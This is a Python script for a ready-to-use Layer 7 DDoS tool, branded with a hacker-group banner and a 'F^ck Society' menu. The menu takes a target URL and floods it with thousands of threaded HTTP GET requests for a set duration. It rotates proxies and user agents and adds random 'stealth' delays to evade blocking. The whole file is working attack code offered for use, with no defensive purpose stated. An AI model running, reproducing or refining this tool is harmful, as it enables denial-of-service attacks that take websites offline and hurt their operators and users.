import requests
import threading
import time
import random
import os
import socket
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
import sys
import simpleaudio as sa

init(autoreset=True)

# Load proxies and UAs
def load_proxies(file_name):
    if not os.path.exists(file_name):
        return []
    with open(file_name) as f:
        return [line.strip() for line in f if line.strip()]

def load_user_agents(file_name):
    if not os.path.exists(file_name):
        return []
    with open(file_name) as f:
        return [line.strip() for line in f if line.strip()]

PROXY_LIST = load_proxies("proxies.txt")
USER_AGENTS = load_user_agents("ua.txt")

ascii_art = f"""{Fore.GREEN}

 #                                    #
 ##                                  ##
 ###                                ###
 ## #              ##              # ##
 ## ##            ####            ## ##
 ##  ##         ###  ###         ##  ##
 ##   ##       ##      ##       ##   ##
 ##    ##    ##          ##    ##    ##
 ##     ##  ##            ##  ##     ##
 ##     #####              #####     ##
 ##      ###                ###      ##
 ##     ####                ####     ##
 ##    ##  ##              ##  ##    ##
 ##  ###    ##            ##    ###  ##
 ## ##       ##          ##       ## ##
 ###          ##        ##          ###
 ##            ##      ##            ##
 #              ##    ##              #
 ##  ##
 ####
      ##     

Setan Kober | We Are United | DDOS attack Layer 7

Author: DirtyHeroes ꦗꦺꦴꦲꦂ ꦥꦭꦕꦶꦠ

"""

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def get_target_ip(url):
    try:
        hostname = url.replace("http://", "").replace("https://", "").split("/")[0]
        return socket.gethostbyname(hostname)
    except:
        return None

def check_website_status(url):
    try:
        response = requests.head(url, timeout=5)
        return response.status_code < 500
    except:
        return False

def attack(target_url, ip, num_threads, duration, use_proxy, stealth):
    total_strikes = 0
    total_misses = 0
    stop_flag = threading.Event()
    lock = threading.Lock()

    def make_request():
        nonlocal total_strikes, total_misses
        while not stop_flag.is_set():
            try:
                proxy = random.choice(PROXY_LIST) if use_proxy and PROXY_LIST else None
                ua = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0"

                headers = {
                    "User-Agent": ua,
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                }
                proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}",
                } if proxy else None

                r = requests.get(target_url, headers=headers, proxies=proxies, timeout=5)
                with lock:
                    total_strikes += 1 if r.status_code < 500 else 0
            except:
                with lock:
                    total_misses += 1
            if stealth:
                time.sleep(random.uniform(0.1, 0.3))

    with tqdm(total=num_threads, desc="Launching attack threads", colour="red") as bar:
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=make_request)
            t.daemon = True
            threads.append(t)
            t.start()
            bar.update(1)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}Interrupted by user.")
    finally:
        stop_flag.set()
        for t in threads:
            t.join()

    return (
        f"{Fore.GREEN}Attack Complete!\n"
        f"Duration     : {duration} seconds\n"
        f"Threads      : {num_threads}\n"
        f"IP           : {ip}\n"
        f"Hits         : {total_strikes}\n"
        f"Misses       : {total_misses}\n"
        f"Proxy        : {'Enabled' if use_proxy else 'Disabled'}\n"
        f"Stealth      : {'Enabled' if stealth else 'Disabled'}"
    )

# Interactive CLI Menu
def main():
    url = ""
    ip = None
    status = None
    threads = 5000
    proxy_enabled = True
    duration = 600
    stealth_mode = True
    last_attack_summary = ""

    while True:
        clear_screen()
        print_centered(ascii_art)
        print("\nCurrent Settings")
        print(f"Target URL          : {url if url else 'Not Set'}")
        print(f"Target IP           : {ip if ip else 'Not Set'}")
        print(f"Status              : {'ACTIVE' if status else 'NOT Reachable'}" if url else "Status: Not Set")
        print(f"Threads             : {threads}")
        print(f"Proxy               : {'Enabled' if proxy_enabled else 'Disabled'}")
        print(f"Stealth Mode        : {'Enabled' if stealth_mode else 'Disabled'}")
        print(f"Duration            : {duration} sec")

        if last_attack_summary:
            print("\nLast Attack Summary")
            print(last_attack_summary)

        print("\n====== F^ck Society ======")
        print("\nMenu:")
        print("1. Input Target URL")
        print("2. Set Threads")
        print("3. Toggle Proxy Use")
        print("4. Toggle Stealth Mode")
        print("5. Set Attack Duration")
        print("6. Start Attack")
        print("7. Exit")
        print("\n==========================")

        choice = input("Enter choice: ")

        if choice == "1":
            url = input("Enter target URL: ")        
            if url:
                ip = get_target_ip(url)
                status = check_website_status(url)
                print(f"Target IP: {ip if ip else 'N/A'}")
                print("Website is ACTIVE." if status else "Website is NOT reachable.")
                input("Press Enter to continue...")
        elif choice == "2":
            threads = int(input("Enter number of threads: "))
        elif choice == "3":
            proxy_enabled = not proxy_enabled
        elif choice == "4":
            stealth_mode = not stealth_mode
        elif choice == "5":
            duration = int(input("Enter attack duration in seconds: "))
        elif choice == "6":
            if not url:
                print("Target URL is not set!")
                input("Press Enter to continue...")
            else:
                last_attack_summary = attack(url, ip, threads, duration, proxy_enabled, stealth_mode)
                input("Press Enter to view results...")
        elif choice == "7":
            print("\n--DDOS Terminated--")
            break
        else:
            print("Invalid choice! Try again.")
            input("Press Enter to continue...")

def print_centered(text):
    width = os.get_terminal_size().columns
    for line in text.splitlines():
        print(line.center(width))

if __name__ == "__main__":
    main()
